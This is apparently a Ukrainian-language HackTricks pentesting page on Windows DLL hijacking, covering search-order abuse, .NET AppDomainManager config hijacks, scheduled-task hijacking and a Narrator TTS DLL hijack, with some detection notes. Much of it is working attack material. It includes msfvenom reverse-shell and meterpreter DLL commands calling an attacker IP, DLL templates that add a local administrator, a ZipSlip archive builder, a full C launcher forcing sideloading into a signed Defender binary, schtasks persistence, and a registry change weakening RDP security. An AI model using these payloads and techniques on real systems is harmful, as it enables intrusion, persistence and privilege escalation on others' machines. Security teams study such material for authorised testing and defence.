# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Основна інформація

DLL Hijacking передбачає маніпулювання довіреною програмою для завантаження шкідливої DLL. Цей термін охоплює кілька тактик, як-от **DLL Spoofing, Injection та Side-Loading**. Переважно це використовується для виконання коду, забезпечення persistence і, рідше, підвищення привілеїв. Попри те, що тут основна увага приділена підвищенню привілеїв, метод hijacking залишається однаковим для різних цілей.

### Поширені техніки

Для DLL hijacking застосовується кілька методів, ефективність кожного з яких залежить від стратегії завантаження DLL програмою:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Заміна справжньої DLL на шкідливу, за потреби з використанням DLL Proxying для збереження функціональності оригінальної DLL.
2. **DLL Search Order Hijacking**: Розміщення шкідливої DLL у шляху пошуку перед легітимною DLL, використовуючи шаблон пошуку програми.
3. **Phantom DLL Hijacking**: Створення шкідливої DLL для завантаження програмою, яка вважає її необхідною DLL, що не існує.
4. **DLL Redirection**: Зміна параметрів пошуку, як-от `%PATH%`, або файлів `.exe.manifest` / `.exe.local`, щоб спрямувати програму до шкідливої DLL.
5. **WinSxS DLL Replacement**: Заміна легітимної DLL на шкідливу копію в каталозі WinSxS — метод, часто пов'язаний із DLL side-loading.
6. **Relative Path DLL Hijacking**: Розміщення шкідливої DLL у контрольованому користувачем каталозі разом зі скопійованою програмою, що нагадує техніки Binary Proxy Execution.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Класичний DLL sideloading — не єдиний спосіб змусити довірений процес **.NET Framework** завантажити код зловмисника. Якщо цільовий виконуваний файл є **managed**-програмою, CLR також перевіряє файл конфігурації програми з назвою, що відповідає назві виконуваного файлу (наприклад, `Setup.exe.config`). Цей файл може визначати власний **AppDomainManager**. Якщо конфігурація вказує на контрольовану зловмисником assembly, розміщену поруч із EXE, CLR завантажує її **до звичайного шляху виконання коду програми** та запускає всередині довіреного процесу.<sup>[[24]](#references)</sup>

Відповідно до схеми конфігурації .NET Framework від Microsoft, для використання власного manager мають бути присутні обидва елементи — `<appDomainManagerAssembly>` і `<appDomainManagerType>`.<sup>[[16]](#references)[[17]](#references)</sup>

Мінімальна конфігурація:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Мінімальний менеджер:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Практичні нотатки:
- Це tradecraft, специфічний для **.NET Framework**. Він залежить від аналізу конфігурації CLR, а не від порядку пошуку DLL у Win32.
- Хост справді має бути **керованим EXE**. Швидке первинне визначення: `sigcheck -m target.exe`, `corflags target.exe` або перевірка наявності **CLR Runtime Header** у метаданих PE.
- Назва конфігураційного файлу має точно відповідати назві виконуваного файлу (`<binary>.config`), і зазвичай він розташований **поруч з EXE**.
- Це корисно для **підписаних бінарних файлів Microsoft/vendor**, оскільки довірений EXE залишається незмінним, тоді як шкідлива керована збірка виконується in-process.
- Якщо у вас уже є каталог інсталятора/оновлення з правом запису, AppDomainManager hijacking можна використати як **першу стадію**, а потім для наступних стадій застосувати класичний DLL sideloading або reflective loading.

### AppDomainManager як downloader + bootstrap для scheduled task

Практичний шаблон intrusion полягає в поєднанні довіреного керованого EXE зі шкідливими `*.config` і DLL AppDomainManager, яка виконує роль лише **невеликого bootstrapper**:<sup>[[25]](#references)</sup>

1. Користувач запускає підписаний .NET installer або updater із правдоподібного розташування, наприклад `%USERPROFILE%\Downloads`.
2. Сусідній config змушує CLR завантажити attacker assembly **до** початку виконання логіки легітимного застосунку.
3. Шкідливий manager виконує **path gate** (наприклад, продовжує роботу лише якщо хостовий EXE запущений із `Downloads`, а друга стадія запускається лише з `%LOCALAPPDATA%`).
4. Якщо перевірка успішна, він завантажує реальний payload у шлях, доступний для запису користувачем, наприклад `%LOCALAPPDATA%\PerfWatson2.exe`, і встановлює persistence за допомогою scheduled task.

Чому цей варіант важливий:
- Підписаний хостовий EXE залишається незміненим, тому triage, під час якого хешується лише основний бінарний файл, може не виявити компрометацію.
- Простий **path-based anti-analysis** є поширеним: навмисне переміщення тріади ZIP/EXE/DLL на Desktop, у Temp або шлях sandbox може перервати ланцюжок.
- DLL AppDomainManager першої стадії може залишатися малою та малопомітною, тоді як реальний implant завантажується пізніше.

Мінімальний приклад persistence, який часто зустрічається в цьому шаблоні:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Примітки:
- ` /rl highest` означає **найвищий доступний рівень** для цього користувача/сеансу; сам по собі він не гарантує ескалацію до SYSTEM.
- Цю техніку часто точніше класифікувати як **виконання/персистентність через зловживання конфігурацією .NET**, а не як класичний hijacking порядку пошуку відсутньої DLL, хоча оператори часто поєднують обидва підходи.

Точки виявлення:
- Підписані .NET-виконувані файли, запущені з **шляхів розпакування ZIP**, `Downloads`, `%TEMP%` або інших доступних для запису користувачу каталогів, із **розміщеним поруч** `<exe>.config`.
- Нові scheduled tasks, дії яких вказують на `%LOCALAPPDATA%`, `%APPDATA%` або `Downloads`, а їхні назви імітують засоби оновлення браузерів/виробників.
- Короткоживучі managed bootstrap-процеси, які одразу завантажують інший EXE, а потім запускають `schtasks.exe`.
- Зразки, які завершують роботу достроково, якщо шлях до виконуваного файлу не відповідає очікуваному каталогу профілю користувача.

### Hijacking наявного scheduled task для повторного запуску sideload chain

Для персистентності не слід шукати лише **створення нового task**. Деякі intrusion sets очікують, доки легітимний інсталятор створить **звичайний task оновлення**, а потім **перезаписують дію task**, щоб наявні назва, автор і trigger залишалися знайомими для захисників.

Повторно використовуваний workflow:
1. Встановіть/запустіть легітимне програмне забезпечення та визначте task, який воно зазвичай створює.
2. Експортуйте XML task і зафіксуйте поточні значення `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Замініть лише дію, щоб task запускав ваш **trusted host EXE** із доступного для запису користувачу staging-каталогу, після чого він виконує side-load або AppDomain-load реального payload.
4. Повторно зареєструйте task із тією самою назвою замість створення нового очевидного persistence-артефакту.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Чому це непомітніше:
- Назва завдання все ще може виглядати легітимною (наприклад, як updater постачальника).
- Його запускає **Task Scheduler service**, тому перевірка батьківського/попередніх процесів часто бачить очікуваний ланцюжок планувальника, а не `explorer.exe`.
- DFIR-команди, які шукають лише **нові назви завдань**, можуть пропустити завдання, реєстрація якого вже існувала, але його action тепер вказує на `%LOCALAPPDATA%`, `%APPDATA%` або інший шлях, контрольований attacker'ом.

Швидкі точки для пошуку:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Порівнюйте XML-файли `C:\Windows\System32\Tasks\*` і metadata `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` з baseline.
- Створюйте alert, коли **updater task, що виглядає як завдання постачальника**, виконується з **директорій, доступних для запису користувачем**, або запускає .NET EXE із розташованим поруч файлом `*.config`.

> [!TIP]
> Для покрокового ланцюжка, який додає HTML staging, AES-CTR configs і .NET implants поверх DLL sideloading, перегляньте наведений нижче workflow.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Пошук відсутніх Dll

Найпоширеніший спосіб знайти відсутні Dll у системі — запустити [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) із sysinternals і **встановити** **такі 2 фільтри**:

![Common Techniques - Пошук відсутніх Dll: Найпоширеніший спосіб знайти відсутні Dll у системі — запустити procmon із sysinternals і встановити такі 2 фільтри](<../../../images/image (961).png>)

![Common Techniques - Пошук відсутніх Dll: Найпоширеніший спосіб знайти відсутні Dll у системі — запустити procmon із sysinternals і встановити такі 2 фільтри](<../../../images/image (230).png>)

і показати лише **File System Activity**:

![Common Techniques - Пошук відсутніх Dll: і показати лише File System Activity](<../../../images/image (153).png>)

Якщо ви шукаєте **відсутні dll загалом**, **залиште** це запущеним на кілька **секунд**.\
Якщо ви шукаєте **відсутню DLL у конкретному executable**, встановіть ще один фільтр, наприклад **"Process Name" "contains" `<exec name>`**, запустіть його та припиніть захоплення events.<sup>[[9]](#references)</sup>

## Exploiting Missing Dlls

Для підвищення привілеїв шукайте **DLL, яку привілейований process намагається завантажити** з location, доступної для запису. Це може статися, коли ви контролюєте directory, яка перевіряється раніше за directory із легітимною DLL, або коли потрібна DLL не існує, а ви можете записувати в одну з directories, що перевіряються.

### Dll Search Order

**У** [**документації Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **можна знайти опис того, як саме завантажуються Dll.**

**Windows applications** шукають DLL, дотримуючись набору **заздалегідь визначених search paths** і певної послідовності. Проблема DLL hijacking виникає, коли шкідливу DLL стратегічно розміщують в одній із цих directories, щоб її було завантажено раніше за справжню DLL. Щоб запобігти цьому, application має використовувати absolute paths під час звернення до потрібних DLL.

Нижче наведено **порядок пошуку DLL у 32-bit** системах:

1. Directory, з якої application було завантажено.
2. System directory. Використовуйте функцію [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), щоб отримати path цієї directory.(_C:\Windows\System32_)
3. 16-bit system directory. Функції для отримання path цієї directory немає, але вона перевіряється. (_C:\Windows\System_)
4. Windows directory. Використовуйте функцію [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), щоб отримати path цієї directory.
1. (_C:\Windows_)
5. Current directory.
6. Directories, перелічені в змінній середовища PATH. Зверніть увагу, що сюди не входить per-application path, вказаний registry key **App Paths**. Key **App Paths** не використовується під час обчислення DLL search path.

Це **порядок пошуку за замовчуванням** із увімкненим **SafeDllSearchMode**. Коли його вимкнено, current directory переміщується на друге місце. Щоб вимкнути цю функцію, створіть registry value **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** і встановіть його в 0 (за замовчуванням функцію увімкнено).

Якщо функцію [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) викликано з **LOAD_WITH_ALTERED_SEARCH_PATH**, пошук починається в directory executable module, який завантажує **LoadLibraryEx**.

Нарешті, DLL можна завантажити за absolute path, а не за name. У такому разі Windows шукає саму DLL лише за цим path; dependencies, запитані за name, усе ще використовують відповідний search order.

Існують інші способи змінити search order, але я не пояснюватиму їх тут.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Використовуйте фільтри **ProcMon** (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`), щоб зібрати names DLL, які process перевіряє, але не знаходить.<sup>[[14]](#references)</sup>
2. Якщо binary запускається за **schedule/service**, розміщення DLL з одним із таких names у **application directory** (search-order entry #1) призведе до її завантаження під час наступного запуску. В одному випадку з .NET scanner process шукав `hostfxr.dll` у `C:\samples\app\` перед завантаженням справжньої копії з `C:\Program Files\dotnet\fxr\...`.
3. Створіть payload DLL (наприклад, reverse shell) з будь-яким export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Якщо ваш primitive — це **arbitrary write у стилі ZipSlip**, створіть ZIP, entry якого виходить за межі extraction dir, щоб DLL опинилася в app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Доставте архів до контрольованої папки inbox/share; коли заплановане завдання повторно запустить процес, він завантажить malicious DLL і виконає ваш код від імені service account.

### Примусове sideloading через RTL_USER_PROCESS_PARAMETERS.DllPath

Розширений спосіб детерміновано вплинути на шлях пошуку DLL нового процесу — встановити поле DllPath у RTL_USER_PROCESS_PARAMETERS під час створення процесу за допомогою native API від ntdll. Якщо вказати тут контрольований зловмисником каталог, цільовий процес, який знаходить імпортовану DLL за іменем (без абсолютного шляху та без використання safe loading flags), можна змусити завантажити malicious DLL із цього каталогу.

Основна ідея
- Створіть параметри процесу за допомогою RtlCreateProcessParametersEx і вкажіть власний DllPath, що вказує на контрольовану вами папку (наприклад, каталог, де розташований ваш dropper/unpacker).
- Створіть процес за допомогою RtlCreateUserProcess. Коли цільовий binary знаходить DLL за іменем, loader перевірить вказаний DllPath під час пошуку, що забезпечує надійне sideloading, навіть якщо malicious DLL не розташована поруч із цільовим EXE.

Примітки та обмеження
- Це впливає на дочірній процес, який створюється; механізм відрізняється від SetDllDirectory, що впливає лише на поточний процес.
- Цільовий процес має імпортувати DLL або викликати LoadLibrary для DLL за іменем (без абсолютного шляху та без використання LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs і жорстко задані абсолютні шляхи неможливо перехопити. Forwarded exports і SxS можуть змінити пріоритет.

Мінімальний приклад C (ntdll, wide strings, спрощена обробка помилок):

<details>
<summary>Повний приклад C: примусове DLL sideloading через RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Приклад практичного використання
- Розмістіть malicious xmllite.dll (яка експортує необхідні функції або проксуює виклики до справжньої DLL) у вашому каталозі DllPath.
- Запустіть підписаний binary, який, як відомо, шукає xmllite.dll за іменем, використовуючи описану вище техніку. Loader розв’язує імпорт через указаний DllPath і виконує sideloading вашої DLL.

Цю техніку спостерігали in-the-wild для побудови багатоступеневих ланцюжків sideloading: початковий launcher розміщує helper DLL, яка потім запускає підписаний Microsoft binary, придатний для hijacking, із власним DllPath, щоб примусово завантажити DLL зловмисника зі staging-директорії.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking через `.exe.config`

Для цілей **.NET Framework** sideloading можна виконати **до `Main()`** без patching пам’яті, зловживаючи розташованим поруч із програмою файлом **`.exe.config`**. Замість того щоб покладатися лише на порядок пошуку DLL Win32, зловмисник розміщує легітимний .NET EXE поруч зі шкідливим config-файлом і однією або кількома assemblies, контрольованими зловмисником.

Як працює цей ланцюжок:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE запускається, а **CLR читає `<exe>.config`**.
2. Config задає **`<appDomainManagerAssembly>`** і **`<appDomainManagerType>`**, щоб runtime інстанціював контрольований зловмисником `AppDomainManager`.
3. Шкідливий manager отримує **виконання до `Main()`** усередині процесу trusted host.
4. Цей самий config може змусити CLR спочатку розв’язувати локальні assemblies (наприклад, `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) і послаблювати runtime validation/telemetry без inline patching.

Шаблон у стилі campaign (точна вкладеність може відрізнятися залежно від директиви / версії CLR):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Чому це корисно:
- **`<probing privatePath="."/>`** забезпечує пошук assembly у каталозі застосунку, перетворюючи папку на передбачувану поверхню для sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** переміщують виконання в код attacker під час ініціалізації CLR, до запуску логіки легітимного застосунку.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** може дозволити full-trust застосунку завантажувати unsigned або tampered assemblies без помилки валідації strong name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** запобігає перенаправленням publisher policy до новіших assemblies.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** робить вибір runtime більш детермінованим.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** особливо цікава, оскільки **CLR вимикає власну видимість через ETW** з конфігурації, замість того щоб implant патчив `EtwEventWrite` у пам'яті.

Операційний патерн, помічений у нещодавніх кампаніях:
- Етап 1: скидає `setup.exe`, `setup.exe.config` і локальні assemblies.
- Етап 2: копіює їх у правдоподібну папку **AppData update**, перейменовує host на щось на кшталт `update.exe` і повторно запускає його через **scheduled task**.
- Етап 3: перевіряє контекст виконання (наприклад, очікуваний parent `svchost.exe` від Task Scheduler), перш ніж завантажити фінальний RAT DLL/export.

Ідеї для hunting:
- Підписані або іншим чином легітимні **.NET executables**, що запускаються з підозрілими сусідніми файлами **`.config`** у доступних для запису користувачем місцях.
- Файли `.config`, що містять **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** або **`etwEnable enabled="false"`**.
- Scheduled tasks, які повторно запускають перейменовані update binaries з **`%LOCALAPPDATA%`** або спеціальних для застосунку каталогів `\bin\update\`.
- Ланцюжки parent/child, у яких scheduled task запускає trusted .NET host, що негайно завантажує non-vendor assemblies із власного каталогу.

#### Винятки з порядку пошуку dll у документації Windows

У документації Windows зазначено певні винятки зі стандартного порядку пошуку DLL:

- Коли виявлено **DLL з таким самим ім'ям, як у вже завантаженої в пам'ять**, система обходить звичайний пошук. Замість цього вона перевіряє redirection і manifest, перш ніж використовувати DLL, яка вже перебуває в пам'яті. **У цьому сценарії система не виконує пошук DLL**.
- Якщо DLL розпізнано як **known DLL** для поточної версії Windows, система використовує власну версію known DLL разом із будь-якими залежними DLL, **пропускаючи процес пошуку**. Реєстровий ключ **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** містить список цих known DLL.
- Якщо **DLL має залежності**, пошук цих залежних DLL виконується так, ніби вони були вказані лише своїми **module names**, незалежно від того, чи початкову DLL було ідентифіковано за повним шляхом.

### Підвищення привілеїв

**Вимоги**:

- Визначити процес, який працює або працюватиме з **іншими привілеями** (horizontal або lateral movement) і якому **бракує DLL**.
- Переконатися, що доступний **запис** до будь-якого **каталогу**, у якому виконуватиметься **пошук DLL**. Це може бути каталог executable або каталог у системному path.

За замовчуванням ці передумови трапляються нечасто: privileged executables зазвичай не мають відсутніх DLL dependencies, а standard users зазвичай не можуть записувати до каталогів системних search-path. Неправильно налаштовані середовища все ж можуть створювати обидві умови.\
Якщо вимоги виконано, перевірте проєкт [UACME](https://github.com/hfiref0x/UACME). Хоча його основна мета — UAC bypass, він містить DLL-hijacking PoC для певних версій Windows, які часто можна адаптувати до знайденого каталогу, доступного для запису.

Зверніть увагу, що свої **права доступу до папки** можна перевірити так:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
І **перевірте дозволи всіх папок усередині PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Також можна перевірити імпорти виконуваного файла та експорти dll за допомогою:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Для повного посібника про те, як **зловживати Dll Hijacking для підвищення привілеїв** із дозволами на запис до папки **System Path**, перегляньте:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Автоматизовані інструменти

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)перевірить, чи маєте ви дозволи на запис до будь-якої папки всередині system PATH.\
Іншими цікавими автоматизованими інструментами для виявлення цієї вразливості є **функції PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ і _Write-HijackDll._

### Приклад

Якщо ви виявили сценарій, придатний для експлуатації, однією з найважливіших умов успішної експлуатації буде **створення dll, яка експортує щонайменше всі функції, що виконуваний файл імпортує з неї**. У будь-якому разі зверніть увагу, що Dll Hijacking зручно використовувати для [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) або з[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Приклад **створення коректної dll** можна знайти в цьому дослідженні Dll Hijacking, присвяченому Dll Hijacking для виконання: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Крім того, у **наступному розділі** можна знайти деякі **базові коди dll**, які можуть бути корисними як **шаблони** або для створення **dll з експортованими функціями, які не є обов'язковими**.

## **Створення та компіляція Dll**

### **Dll Proxifying**

По суті, **Dll proxy** — це Dll, здатна **виконати ваш шкідливий код під час завантаження**, а також **надавати** та **працювати** так, **як очікується**, перенаправляючи всі виклики до справжньої бібліотеки.

За допомогою інструмента [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) або [**Spartacus**](https://github.com/Accenture/Spartacus) можна вказати виконуваний файл і вибрати бібліотеку, яку потрібно проксіювати, а потім **згенерувати proxified dll**, або **вказати Dll** і **згенерувати proxified dll**.

### **Meterpreter**

**Отримання rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Отримайте meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Створення користувача (x86, я не бачив версії x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Власний варіант

У багатьох випадках скомпільована вами DLL має **експортувати кожну функцію, імпортовану процесом-жертвою**. Якщо потрібний експорт відсутній, бінарний файл не може його розв'язати, і exploit завершується невдало.

<details>
<summary>Шаблон DLL на C (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Приклад C++ DLL зі створенням користувача</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Альтернативна C DLL із точкою входу потоку</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Практичний приклад: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe під час запуску все ще перевіряє передбачувану мовозалежну DLL локалізації, яку можна перехопити для довільного виконання коду та persistence.<sup>[[7]](#references)</sup>

Ключові факти
- Шлях перевірки (у поточних збірках): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Застарілий шлях (у старіших збірках): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Якщо за шляхом OneCore існує доступна для запису DLL, контрольована атакувальником, її буде завантажено, а `DllMain(DLL_PROCESS_ATTACH)` виконається. Експорти не потрібні.

Виявлення за допомогою Procmon
- Фільтр: `Process Name is Narrator.exe` і `Operation is Load Image` або `CreateFile`.
- Запустіть Narrator і спостерігайте за спробою завантаження DLL за наведеним вище шляхом.

Мінімальна DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Наївний hijack спричиняє озвучення/підсвічування UI. Щоб залишатися непомітним, під час attach перелічіть потоки Narrator, відкрийте головний потік (`OpenThread(THREAD_SUSPEND_RESUME)`) і призупиніть його за допомогою `SuspendThread`; продовжуйте виконання у власному потоці. Повний код наведено в PoC.<sup>[[8]](#references)</sup>

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- За наведених вище умов запуск Narrator завантажує planted DLL. На secure desktop (екрані входу) натисніть CTRL+WIN+ENTER, щоб запустити Narrator; ваша DLL виконається як SYSTEM на secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Дозвольте класичний рівень безпеки RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Підключіться до хоста через RDP, на екрані входу натисніть CTRL+WIN+ENTER, щоб запустити Narrator; ваша DLL виконається як SYSTEM на secure desktop.
- Виконання припиняється після закриття RDP-сесії — виконайте inject/migrate якнайшвидше.

